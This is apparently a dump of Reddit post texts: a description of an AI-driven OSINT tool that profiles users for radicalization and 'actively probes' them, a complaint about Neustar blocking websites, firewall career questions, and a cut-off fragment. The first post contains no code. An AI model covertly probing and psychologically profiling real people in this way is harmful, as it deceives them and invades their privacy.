    "text": "AI-powered OSINT + Active Probing: Simulated HUMINT Interrogation via Reddit Activity. I'm a security researcher exploring how open-source tools can simulate early-stage threat profiling through public platforms like Reddit.\n\nRecently, I built a proof-of-concept tool that combines traditional OSINT techniques with active probing via simulated conversation \u2014 mimicking the first-touch layer of HUMINT interrogation but in a controlled, automated setting.\n\n# Key Features:\n\n* Scrapes a target's public Reddit history (posts, comments, subreddit activity) and generates a profile of their ideological leanings, triggers, and potential for radicalization.\n* Assigns scores based on sentiment patterns, grievance language, group affiliations, and interaction types.\n* Uses an AI agent to simulate follow-up interactions (currently through public replies or sandboxed tests) to extract more revealing behavioral cues, similar to an initial field interrogation.\n* Presents structured reports (radicalization score, psychological profile, trigger points) through a clean UI designed for rapid threat triage.\n\n# What Makes It Different:\n\n* Moves beyond passive scraping to\u00a0**active probing**, enabling simulated escalation to test ideological rigidity and intent.\n* Mimics\u00a0**automated HUMINT**\u00a0for digital platforms, offering a new layer in open-source behavioral intelligence.\n* Designed with usability in mind \u2014 built a minimal UI to visualize profiles, track interactions, and flag cases of concern.\n\n# Ethical Notes:\n\n* All tests conducted on dummy accounts or public data.\n* No private data scraped. No unsolicited DMs sent. Reddit ToS fully respected.\n* The goal is to show how far solo researchers can push open tooling responsibly.\n\nThis is not a production deployment but a concept to spark conversation around the growing gap between traditional OSINT and real-time psychological analysis. I\u2019m aware intelligence agencies likely use far more sophisticated tooling \u2014 this is a step toward democratizing that conversation for defenders.\n\nThis is a demo: [https://youtu.be/0PUKqmWCWhU](https://youtu.be/0PUKqmWCWhU)",

    "text": "Neustar rating websites as unsafe and blocking them even if they are innocuous. I've found there is a service called Neustar (owned by the company Vercara, which is in turned owned by Digicert) which rates websites according to safety. There are several different services which do this.\n\nIf you look at the below web page and scroll down to the safety section you will see a variety of companies rating websites, including Neustar.\n\n[https://www.wmtips.com/tools/info/apple.com](https://www.wmtips.com/tools/info/apple.com)\n\nIt seems there is more than just an innocous rating which people can look at and ignore. But in certain network environments such as companies, universities, Wifi networks in cafes, coaches, airports etc, websites will get blocked and warnings going up saying the websites are unsafe.\n\nI've spoken to a few other people and they have had the same experiences as myself. They have been visiting a website for some time and then they use a different Wifi network and they find it is blocked and messages come up saying it is unsafe.\n\nI did an Internet search for the words \"Neustar website blocked\" and quite a few results are returned. One in particular is\n\n[https://www.sitejabber.com/reviews/neustar.com](https://www.sitejabber.com/reviews/neustar.com)\n\nIt seems this Neustar service has been blocking websites for at least the past 6 years. The review mentioned above seems to think they block websites by fiddling with DNS.\n\n***So why am I posting this? Because I think this needs a public announcement. That essentially private companies have the power to censor websites - even totally innocuous websites and put up messages saying they are unsafe.***\n\nAt least if there is a new post about this matter, other people can find it, comment on it and we can just how many people have been effected by. If you read some of the posts coming up for searches on \"neustar blocked website\" you will find a handful of people are really annoyed about what has gone on and are looking for ways to get around Neustar.",

    "text": "Seeking Advice on Becoming a Self-Employed Firewall Developer. Hi everyone,  \n\nI'm about to begin studying cybersecurity next year, and I'm already thinking ahead about my long-term goal of becoming a self-employed firewall developer. I'd really appreciate some honest advice from experienced professionals about how feasible this path is and what it would realistically take to succeed.  \n\nFrom what I understand, the firewall market seems pretty competitive, but I'm wondering if there's still room for independent specialists. Do clients typically look for freelancers in this space, or is it dominated by larger firms? I'm particularly interested in whether focusing on specific niches - like cloud-based firewalls or solutions for SMEs - might be a smarter approach than trying to compete across the board.  \n\nOn the technical side, I'm trying to figure out where to focus my learning. Which firewall platforms are most in demand for independent developers - is it worth specializing in Palo Alto or Cisco systems, or should I prioritize open-source solutions like pfSense? Beyond the firewall systems themselves, what complementary skills would make me more valuable? For instance, how important are programming skills (Python, C++), network architecture knowledge, or understanding of broader security frameworks?  \n\nI've heard mixed opinions about certifications. Some say vendor-specific certs are crucial for credibility, while others argue broader security certifications matter more. For someone aiming at self-employment, which would give me better ROI - something like PCNSE or NSE, or more general credentials like CISSP?  \n\nExperience is another big question. How much hands-on work would I realistically need before going independent? Could I build enough credibility through internships and personal projects, or would I absolutely need several years in a corporate security role first?  \n\nThen there's the business side of things - how do independent firewall developers typically find clients? Is it mostly through referrals, or are there specific platforms or networks that work well? What are the biggest challenges in running this kind of business that I might not be anticipating?  \n\nIf pure firewall development turns out to be too narrow, what related services might complement it well? Would offering security assessments, configuration audits, or maybe even training services make sense as part of a broader offering?  \n\nI'm really eager to hear from anyone who's gone down this path or works with independent security specialists. What would you do differently if you were starting today? Any major pitfalls to avoid or unexpected opportunities to pursue?  \n\nThanks in advance for sharing your wisdom - I'm just starting out and want to make sure I'm building the right skills and mindset for this challenging but exciting career path!  \n",

If the business didn't make the right call - well, that's on them, not on me for not providing better intel stream or deeper analysis, I've done my best.\n\nRight now, I am staring at those two old fragments, and can't help but feel that those remain painfully relevant and relatable.
